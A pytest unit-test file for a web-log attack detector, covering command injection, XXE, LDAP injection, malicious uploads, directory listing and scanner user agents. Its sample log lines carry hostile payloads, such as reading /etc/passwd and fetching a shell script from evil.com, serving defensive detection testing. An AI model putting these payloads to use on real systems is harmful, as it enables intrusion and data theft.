"""
Unit tests for Tier 1 attack detection (NEW attacks)
"""
import pytest
from analyzer.detector import detect_suspicious


class TestCommandInjectionDetection:
    """Test Command Injection detection"""
    
    def test_semicolon_command_injection(self):
        """Test command injection with semicolon"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /exec.php?cmd=ping 8.8.8.8; cat /etc/passwd HTTP/1.1" 500 1024'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "COMMAND_INJECTION"
        assert suspicious[0]["severity"] == "CRITICAL"
        assert suspicious[0]["score"] == 100
    
    def test_pipe_command_injection(self):
        """Test command injection with pipe"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /search.php?q=test | whoami HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "COMMAND_INJECTION"
    
    def test_backtick_command_injection(self):
        """Test command injection with backticks"""
        logs = [
            '10.0.0.1 - - [12/Dec/2025:10:18:44 +0300] "GET /run.php?cmd=`wget http://evil.com/shell.sh` HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "COMMAND_INJECTION"
    
    def test_dollar_command_injection(self):
        """Test command injection with $(...)"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /test.php?input=$(curl http://evil.com) HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "COMMAND_INJECTION"
    
    def test_multiple_commands(self):
        """Test various dangerous commands"""
        commands = ["nc", "bash", "python", "rm", "chmod", "wget", "curl"]
        
        for cmd in commands:
            logs = [
                f'192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /exec.php?cmd=test; {cmd} evil HTTP/1.1" 200 512'
            ]
            
            suspicious = detect_suspicious(logs)
            assert len(suspicious) == 1
            assert suspicious[0]["type"] == "COMMAND_INJECTION"


class TestXXEDetection:
    """Test XXE (XML External Entity) detection"""
    
    def test_entity_declaration(self):
        """Test XXE with ENTITY declaration"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php HTTP/1.1" 200 512 "<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "XXE"
        assert suspicious[0]["severity"] == "CRITICAL"
        assert suspicious[0]["score"] == 95
    
    def test_doctype_declaration(self):
        """Test XXE with DOCTYPE"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /api.php HTTP/1.1" 200 512 "<!DOCTYPE foo [<!ELEMENT foo ANY>]>"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "XXE"
    
    def test_system_identifier(self):
        """Test XXE with SYSTEM identifier"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /xml.php HTTP/1.1" 200 512 SYSTEM "http://evil.com/xxe"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "XXE"
    
    def test_file_protocol(self):
        """Test XXE with file:// protocol"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /parse.php?url=file:///etc/passwd HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "XXE"
    
    def test_php_protocol(self):
        """Test XXE with php:// protocol"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /read.php?file=php://filter/resource=index.php HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "XXE"


class TestLDAPInjectionDetection:
    """Test LDAP Injection detection"""
    
    def test_wildcard_injection(self):
        """Test LDAP injection with wildcard"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /login.php HTTP/1.1" 200 512 "username=*)(uid=*"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "LDAP_INJECTION"
        assert suspicious[0]["severity"] == "HIGH"
        assert suspicious[0]["score"] == 85
    
    def test_or_filter_injection(self):
        """Test LDAP OR filter injection"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /search.php?user=admin)(|(uid=* HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "LDAP_INJECTION"
    
    def test_cn_injection(self):
        """Test LDAP CN injection"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /ldap.php HTTP/1.1" 200 512 "filter=, cn=admin"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "LDAP_INJECTION"


class TestMaliciousUploadDetection:
    """Test Malicious File Upload detection"""
    
    def test_php_upload(self):
        """Test PHP file upload attempt"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=shell.php HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "MALICIOUS_UPLOAD"
        assert suspicious[0]["severity"] == "HIGH"
        assert suspicious[0]["score"] == 85
    
    def test_asp_upload(self):
        """Test ASP/ASPX file upload"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=webshell.aspx HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "MALICIOUS_UPLOAD"
    
    def test_null_byte_upload(self):
        """Test null byte injection in upload"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=innocent.jpg%00.php HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "MALICIOUS_UPLOAD"
    
    def test_executable_upload(self):
        """Test executable file upload"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=malware.exe HTTP/1.1" 200 512'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "MALICIOUS_UPLOAD"
    
    def test_script_uploads(self):
        """Test various script file uploads"""
        extensions = ["py", "sh", "bat", "cmd", "pl", "cgi", "jsp"]
        
        for ext in extensions:
            logs = [
                f'192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=script.{ext}? HTTP/1.1" 200 512'
            ]
            
            suspicious = detect_suspicious(logs)
            assert len(suspicious) == 1, f"Failed to detect .{ext} upload"
            assert suspicious[0]["type"] == "MALICIOUS_UPLOAD"


class TestDirectoryListingDetection:
    """Test Directory Listing detection"""
    
    def test_index_of_detection(self):
        """Test 'Index of /' pattern"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /backup/ HTTP/1.1" 200 1024 "<title>Index of /backup</title>"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "DIRECTORY_LISTING"
        assert suspicious[0]["severity"] == "MEDIUM"
        assert suspicious[0]["score"] == 60
    
    def test_directory_listing_pattern(self):
        """Test 'Directory listing for' pattern"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /files/ HTTP/1.1" 200 1024 "Directory listing for /files/"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "DIRECTORY_LISTING"
    
    def test_parent_directory_link(self):
        """Test parent directory link pattern"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /uploads/ HTTP/1.1" 200 1024 "[To Parent Directory]"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "DIRECTORY_LISTING"


class TestSuspiciousAgentDetection:
    """Test Suspicious User-Agent detection"""
    
    def test_sqlmap_agent(self):
        """Test sqlmap detection"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /index.php HTTP/1.1" 200 512 "-" "sqlmap/1.0"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "SUSPICIOUS_AGENT"
        assert suspicious[0]["severity"] == "MEDIUM"
        assert suspicious[0]["score"] == 70
    
    def test_nikto_agent(self):
        """Test nikto scanner detection"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET /admin/ HTTP/1.1" 404 512 "-" "Nikto/2.1"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "SUSPICIOUS_AGENT"
    
    def test_nmap_agent(self):
        """Test nmap detection"""
        logs = [
            '192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine)"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 1
        assert suspicious[0]["type"] == "SUSPICIOUS_AGENT"
    
    def test_multiple_scanners(self):
        """Test various security scanners"""
        scanners = ["acunetix", "nessus", "burp", "metasploit", "wpscan"]
        
        for scanner in scanners:
            logs = [
                f'192.168.1.1 - - [12/Dec/2025:10:18:44 +0300] "GET / HTTP/1.1" 200 512 "-" "{scanner}"'
            ]
            
            suspicious = detect_suspicious(logs)
            assert len(suspicious) == 1, f"Failed to detect {scanner}"
            assert suspicious[0]["type"] == "SUSPICIOUS_AGENT"


class TestMultipleNewAttacks:
    """Test combinations of new attack types"""
    
    def test_all_tier1_attacks(self):
        """Test all Tier 1 attacks in one log"""
        logs = [
            '10.0.0.1 - - [12/Dec/2025:10:18:44 +0300] "GET /exec.php?cmd=; cat /etc/passwd HTTP/1.1" 500 1024',
            '10.0.0.2 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php HTTP/1.1" 200 512 "<!ENTITY xxe>"',
            '10.0.0.3 - - [12/Dec/2025:10:18:44 +0300] "GET /ldap.php?user=*)(uid=* HTTP/1.1" 200 512',
            '10.0.0.4 - - [12/Dec/2025:10:18:44 +0300] "POST /upload.php?file=shell.php HTTP/1.1" 200 512',
            '10.0.0.5 - - [12/Dec/2025:10:18:44 +0300] "GET /backup/ HTTP/1.1" 200 1024 "Index of /"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        assert len(suspicious) == 5
        
        types = {s["type"] for s in suspicious}
        assert "COMMAND_INJECTION" in types
        assert "XXE" in types
        assert "LDAP_INJECTION" in types
        assert "MALICIOUS_UPLOAD" in types
        assert "DIRECTORY_LISTING" in types
    
    def test_severity_levels(self):
        """Test that severity levels are correct for new attacks"""
        logs = [
            '10.0.0.1 - - [12/Dec/2025:10:18:44 +0300] "GET /exec.php?cmd=; whoami HTTP/1.1" 500 1024',
            '10.0.0.2 - - [12/Dec/2025:10:18:44 +0300] "POST /api.php HTTP/1.1" 200 512 "<!ENTITY xxe>"',
            '10.0.0.3 - - [12/Dec/2025:10:18:44 +0300] "GET /backup/ HTTP/1.1" 200 1024 "Index of /"'
        ]
        
        suspicious = detect_suspicious(logs)
        
        for event in suspicious:
            if event["type"] in ["COMMAND_INJECTION", "XXE"]:
                assert event["severity"] == "CRITICAL"
            elif event["type"] in ["LDAP_INJECTION", "MALICIOUS_UPLOAD"]:
                assert event["severity"] == "HIGH"
            elif event["type"] == "DIRECTORY_LISTING":
                assert event["severity"] == "MEDIUM"